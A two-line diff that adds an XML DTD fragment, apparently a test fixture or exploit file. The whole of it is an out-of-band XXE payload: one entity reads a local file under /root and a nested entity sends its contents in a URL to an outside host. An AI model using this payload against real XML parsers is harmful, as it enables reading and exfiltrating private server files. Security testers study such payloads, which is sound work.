@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "file:///root/somefile">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://chickenfeet.glitterpants.org/?%payl;'>">
